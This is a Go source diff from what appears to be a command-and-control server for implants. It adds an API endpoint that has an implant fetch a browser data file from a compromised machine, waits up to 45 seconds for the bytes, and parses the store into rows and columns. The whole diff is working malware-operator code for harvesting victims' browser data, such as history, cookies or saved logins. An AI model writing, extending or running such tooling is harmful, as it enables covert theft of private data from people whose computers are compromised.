@@ -76,6 +76,7 @@ func New(cfg *config.Config, hub *session.Hub, lm *listener.Manager, ui http.Han
 	mux.HandleFunc("POST /api/sessions/{id}/fs/ls", s.auth(s.fsLs))
 	mux.HandleFunc("POST /api/sessions/{id}/browser", s.auth(s.browser))
 	mux.HandleFunc("GET /api/browser/{host}", s.auth(s.browserHistory))
+	mux.HandleFunc("POST /api/sessions/{id}/browser/query", s.auth(s.browserQuery))
 	mux.HandleFunc("POST /api/sessions/{id}/fs/get", s.auth(s.fsGet))
 	mux.HandleFunc("POST /api/sessions/{id}/fs/put", s.auth(s.fsPut))
 	mux.HandleFunc("GET /api/sessions/{id}/xfers", s.auth(s.xferList))
@@ -326,6 +327,71 @@ func (s *Server) enqueueKind(w http.ResponseWriter, id string, kind session.Task
 		return
 	}
 	writeJSON(w, 200, map[string]string{"task_id": tid})
+}
+
+func (s *Server) browserQuery(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	var body struct {
+		Path string `json:"path"`
+		Kind string `json:"kind"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeErr(w, 422, "invalid json")
+		return
+	}
+	body.Path = strings.TrimSpace(body.Path)
+	if body.Path == "" {
+		writeErr(w, 422, "path required")
+		return
+	}
+	if _, ok := browser.Spec(body.Kind); !ok {
+		writeErr(w, 422, "unknown kind")
+		return
+	}
+	data, err := s.fetchFile(id, body.Path)
+	if err != nil {
+		if errors.Is(err, session.ErrNoSession) || errors.Is(err, session.ErrOffline) {
+			writeErr(w, 409, err.Error())
+			return
+		}
+		writeErr(w, 500, err.Error())
+		return
+	}
+	cols, rows, err := browser.Run(data, body.Kind)
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]any{"columns": cols, "rows": rows, "bytes": len(data)})
+}
+
+// fetchFile runs an fs.get task and waits for the bytes. The hub caps task
+// output at 16 MB, which is plenty for browser stores.
+func (s *Server) fetchFile(id, path string) ([]byte, error) {
+	tid, err := s.hub.Enqueue(id, session.TaskFsGet, path)
+	if err != nil {
+		return nil, err
+	}
+	deadline := time.Now().Add(45 * time.Second)
+	for {
+		t := s.hub.GetTask(tid)
+		if t == nil {
+			return nil, errors.New("task lost")
+		}
+		if t.Err != "" {
+			return nil, errors.New(t.Err)
+		}
+		if t.Done {
+			if len(t.Output) == 0 {
+				return nil, errors.New("empty file or read failed")
+			}
+			return t.Output, nil
+		}
+		if time.Now().After(deadline) {
+			return nil, errors.New("timeout reading file from implant")
+		}
+		time.Sleep(120 * time.Millisecond)
+	}
 }
 
 func (s *Server) browserHistory(w http.ResponseWriter, r *http.Request) {
